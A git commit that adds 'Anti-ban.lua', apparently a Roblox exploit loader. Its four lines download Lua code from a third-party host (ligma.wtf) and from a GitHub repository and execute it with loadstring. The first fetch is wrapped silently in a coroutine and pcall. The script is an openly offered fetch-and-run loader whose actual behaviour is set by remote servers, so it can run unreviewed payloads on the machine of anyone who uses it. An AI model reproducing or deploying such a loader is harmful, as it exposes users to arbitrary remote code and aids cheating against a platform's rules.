9041ed7164532ce8a9efc83e7eb451208070b667
ksenorebat <ksenorebat@yandex.ru>
2025-06-11 01:30:10 +0500

    Add files via upload

---
+++ Anti-ban.lua
@@ -0,0 +1,4 @@
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
+end)
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/ksenorebat/kseno/main/Antiban.lua", true))(...)
